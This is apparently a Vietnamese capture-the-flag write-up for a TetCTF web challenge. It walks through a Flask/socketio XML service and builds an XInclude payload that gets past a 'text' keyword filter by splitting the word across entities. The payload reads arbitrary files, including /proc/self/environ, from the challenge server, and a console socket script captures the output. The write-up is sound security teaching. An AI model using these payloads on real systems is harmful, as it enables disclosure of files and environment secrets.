## :rocket: 2X-Service

![image](https://user-images.githubusercontent.com/61876488/147883546-53a61907-6a78-4e29-b731-3ea98af468a1.png)

[+] [Source](https://drive.google.com/file/d/14Dxlqqvij9ttMIq2uEVzjzez0v4iPDd6/view?usp=sharing)

### 1. Initial reconnaissance:

![](https://i.imgur.com/pBAQpWM.png)

- Bài này khá giống với bài XService ở Final SVATTT 2021, nhưng mà chắc chắn tác giả sẽ sửa lại gì đó. Thử nhập linh tinh gì đó vào 2 field **XPATH** và **XML** rồi ấn **Process** thì nó alert ra "Nani?".

![](https://i.imgur.com/tKWln4X.png)


- Check `/source` để lấy source về đọc cho chắc.

### 2. Source Analysis and Bypass XXE:

##### a) Reading and understand:

- Web app sử dụng [Flask](https://flask.palletsprojects.com/en/2.0.x/) để render các static file, [flask_socketio](https://flask-socketio.readthedocs.io/en/latest/intro.html) để xử lý các WebSocket và [ElementTree XML API](https://docs.python.org/3/library/xml.etree.elementtree.html) để parse XML data có trong WebSocket. Các bạn chưa hiểu WebSocket có thể đọc tại [đây](https://portswigger.net/web-security/websockets/what-are-websockets).

- Đoạn code mà chúng ta cần chú ý ở đây:

```python=
@socketio.on('message')
def handle_message(xpath, xml):
	if len(xpath) != 0 and len(xml) != 0 and "text" not in xml.lower():
		try:
			res = ''
			root = ElementTree.fromstring(xml.strip())
			ElementInclude.include(root)
			for elem in root.findall(xpath):
				if elem.text != "":
					res += elem.text + ", "
			emit('result', res[:-2])
		except Exception as e:
			emit('result', 'Nani?')
	else:
		emit('result', 'Nani?')
```

- Hàm `handle_message` đảm nhận vai trò là `server-side event handler` cho một unnamed event gửi đến server, hay còn gọi là các message. Message được gửi đến server cần phải có đủ 2 thành phần là **xpath** và **xml**, đồng thời bên trong string **xml** đã được lowercase không được chứa "text", nếu không server sẽ gửi reply message đến client đang connect đến với value "Nani?" ứng với key "result": 

```python=
if len(xpath) != 0 and len(xml) != 0 and "text" not in xml.lower():
	...
else:
	emit('result', 'Nani?')
```

- Không những vậy nếu biến **xml** chỉ là một string bình thường không chứa XML data thì khi parse với ElementTree XML API nó sẽ gây ra Exception và server cũng sẽ gửi đến client message "Nani?":

```python=
try:
	res = ''
	root = ElementTree.fromstring(xml.strip())
	ElementInclude.include(root)
	for elem in root.findall(xpath):
		if elem.text != "":
			res += elem.text + ", "
	emit('result', res[:-2])
except Exception as e:
	emit('result', 'Nani?')
```

--> Tóm lại sẽ có 2 tình huống sau khiến browser alert ra message "Nani?" khi chúng ta submit form:

\+ Không nhập vào cái gì, hoặc thiếu một trong 2 field **xpath** và **xml**

\+ String nhập vào **XML** không phải là một XML data hợp lệ.

- Để hiểu quá trình xử lí XML data và trả về result diễn ra như nào thì xin mời các bạn đọc phần Local Demo sau đây.

##### b) Local Demo:

- Ở phần demo trên local này, thay vì lấy **XML** và **XPATH** từ form như web app trên, mình sẽ bỏ **XML** vào một file `data.xml` rồi đọc vào và **XPATH** sẽ được input từ bàn phím. Các quá trình xử lý XML data vẫn giữ nguyên không đổi.

```python=
# xml_parse.py
from xml.etree import ElementTree, ElementInclude

xml = open("data.xml", "r").read()
print("XPATH: ")
xpath = input()

try:
    res = ''
    root = ElementTree.fromstring(xml.strip())
    ElementInclude.include(root)
    for elem in root.findall(xpath):
        if elem.text != "":
            res += elem.text + ", "
    print('result:', res[:-2])
except Exception as e:
    print("Nani?")
```

```xml=
# data.xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>
  Hello World
</data>
</document>
```

- Ví dụ ta có `XPATH='data'`, khi đó:

![](https://i.imgur.com/yOIuY6Q.png)

- Cho các bạn chưa hiểu XPATH là gì có thể đọc tại [đây](https://www.w3schools.com/xml/xpath_intro.asp). Nói dễ hiểu thì chúng ta cần cung cấp cho biến XPATH tên của một node mà chúng ta cần lấy value trong XML data, nó sẽ in ra value của node đó, trong trường hợp này là node có tên là `data`. Chúng ta hoàn toàn có thể lợi dụng điều này để đọc một file bất kì, chỉ cần chỉnh sửa một chút ở file `data.xml`, với `flag.txt` là một file bất kì với nội dung là `hahahahahahaa`:

```xml=
# data.xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY text "text">
]>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>This document is about
  <xi:include href="flag.txt" parse="&text;"/>
 </data>
</document>
```

- Kết quả:

![](https://i.imgur.com/h0L7Ql7.png)

- Nhưng `"text" not in xml.lower()`, "text" không được phép có trong XML string. Vậy chúng ta bypass bằng cách nào? Rất đơn giản, chỉ cần chia đôi string "text" rồi bỏ nó vào 2 entity riêng rồi truyền vào attribute "parse". Kết quả vẫn sẽ giống như trên.

```xml=
# data.xml
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>This document is about
  <xi:include href="flag.txt" parse="&te;&xt;"/>
</data>
</document>
```

- Ngoài ra nếu như mình thay `flag.txt` bằng một file không tồn tại, ví dụ `secret.txt`, thì nó sẽ sinh ra Exception dẫn đến in ra "Nani?":

![](https://i.imgur.com/7Wux9FY.png)

### 3. Add an event listener to read ouput:

- Mình đã nghĩ đến đây là xong rồi, chỉ việc nhập vào **XPATH** là "data" còn **XML** thì paste nguyên cái file data.xml mới nhất kia lấy flag ngon ơ. Nhưng mà thế thì dễ quá! 

![](https://i.imgur.com/7Jpld6Z.png)

- Theo như demo trên local thì XML data của mình đã đúng format, 2 field **XML** và **XPATH** đều đã được điền đầy đủ, vậy chỉ còn một trường hợp duy nhất là file `flag.txt` không tồn tại trên hệ thống, bởi vì khi mình thử đọc các file khác như `/proc/meminfo` thì vẫn đọc được bình thường:

![](https://i.imgur.com/6dphvjo.png)

- Hmmm, khá là guessing! Mình phải mò xem trong Linux có "magic file" nào mà tác giả có thể giấu flag ở đó không. Mình chợt nhớ ra ở SVATTT có bài nào đó dùng Flask và giấu flag ở trong [environment variable của một process](https://unix.stackexchange.com/questions/29128/how-to-read-environment-variables-of-a-process) :D. Để đọc được các environment variable của chính process đang chạy web app này ta dùng `/proc/self/environ`:

![](https://i.imgur.com/xgRw2ij.png)

- Khá là cay cú vì alert prompt của Chrome đã giới hạn kí tự rồi, ông tác giả còn "chơi" mình bằng cách spam một dãy "dddddd..." để mình không thể đọc hết toàn bộ nội dung của file `/proc/self/environ` nữa :). Mà "chơi" kiểu này thì chắc kèo flag nằm ở `/proc/self/environ` rồi :D.

- Mình chợt nảy ra một ý tưởng về việc đọc file `/proc/self/environ` qua console khi thấy đoạn này trong doc:

![](https://i.imgur.com/xOgtbGX.png)

- Chúng ta hoàn toàn có thể tự tạo một socket connection đến server, sau đó đặt một event lister tại connection đó để khi reply message gửi đến client, thay vì hiện trên alert, nó sẽ trả về trong console (bạn có thể tham khảo ý tưởng build script tại [đây](https://socket.io/docs/v4/)):

```javascript=
socket = io()
socket.connect('http://207.148.119.136:8003')
socket.on('connect', function() {
  console.log(socket.connected)
})
socket.on('result', function (data) {
  console.log(data);
});    
```
- Chúng ta paste cái script trên vào console để tạo event listener "result", sau đó submit form theo thứ tự như này:

  \+ xpath: `data`

  \+ xml:

```xml=
<?xml version='1.0'?>
<!DOCTYPE resources [
  <!ENTITY te "te">
  <!ENTITY xt "xt">
]>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <data>This document is about
  <xi:include href="/proc/self/environ" parse="&te;&xt;"/>
</data>
</document>
``` 

- Flag ở đây rồi, đúng như mình dự đoán!

![](https://i.imgur.com/iVw65za.png)

`TetCTF{Just_Warm_y0u_uP_:P__}`
